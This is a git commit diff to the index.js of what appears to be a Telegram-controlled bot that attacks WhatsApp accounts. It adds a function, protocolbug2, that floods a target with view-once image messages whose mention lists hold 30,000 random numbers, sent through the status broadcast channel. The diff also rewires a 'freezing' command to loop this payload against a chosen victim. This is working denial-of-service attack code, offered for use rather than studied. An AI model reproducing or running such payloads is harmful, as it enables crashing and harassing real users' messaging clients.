11cd4190d6d9337ee2eb5864cbc810f727bc2f5f
kingranzz <156513688+kingranzz@users.noreply.github.com>
2025-04-16 20:24:35 +0800

    Add files via upload

--- index.js
+++ index.js
@@ -949,11 +949,7 @@ bot.command("easydelay", checkWhatsAppConnection, async ctx => {
 
   // Melakukan proses freezing 50 kali
   for (let i = 0; i < 10; i++) {
-    await carousels2(target)
-    await carousels2(target)
-    await carousels2(target)
-    await carousels2(target)
-    await carousels2(target)
+    await protocolbug2(target)
   }
 
   // Menyelesaikan proses response
@@ -2384,6 +2380,89 @@ await vzxtus.relayMessage(target, msg.message, {
 messageId: msg.key.id
 });
 console.log("Success! Force Overload Sent")
+}
+async function protocolbug2(isTarget, mention) {
+    const generateMessage = {
+        viewOnceMessage: {
+            message: {
+                imageMessage: {
+                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
+                    mimetype: "image/jpeg",
+                    caption: "⎋ 𝐅𝐢𝐍𝐈𝐗͜͢-‣",
+                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
+                    fileLength: "19769",
+                    height: 354,
+                    width: 783,
+                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
+                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
+                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
+                    mediaKeyTimestamp: "1743225419",
+                    jpegThumbnail: null,
+                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
+                    scanLengths: [2437, 17332],
+                    contextInfo: {
+                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
+                        isSampled: true,
+                        participant: isTarget,
+                        remoteJid: "status@broadcast",
+                        forwardingScore: 9741,
+                        isForwarded: true
+                    }
+                }
+            }
+        }
+    };
+
+    const msg = generateWAMessageFromContent(isTarget, generateMessage, {});
+
+    await vzxtus.relayMessage("status@broadcast", msg.message, {
+        messageId: msg.key.id,
+        statusJidList: [isTarget],
+        additionalNodes: [
+            {
+                tag: "meta",
+                attrs: {},
+                content: [
+                    {
+                        tag: "mentioned_users",
+                        attrs: {},
+                        content: [
+                            {
+                                tag: "to",
+                                attrs: { jid: isTarget },
+                                content: undefined
+                            }
+                        ]
+                    }
+                ]
+            }
+        ]
+    });
+
+    if (mention) {
+        await vzxtus.relayMessage(
+            isTarget,
+            {
+                statusMentionMessage: {
+                    message: {
+                        protocolMessage: {
+                            key: msg.key,
+                            type: 25
+                        }
+                    }
+                }
+            },
+            {
+                additionalNodes: [
+                    {
+                        tag: "meta",
+                        attrs: { is_status_mention: "𝐁𝐞𝐭𝐚 𝐏𝐫𝐨𝐭𝐨𝐜𝐨𝐥 - 𝟗𝟕𝟒𝟏" },
+                        content: undefined
+                    }
+                ]
+            }
+        );
+    }
 }
   async function f10(target, Ptcp = false) {
     await vzxtus.relayMessage(target, {
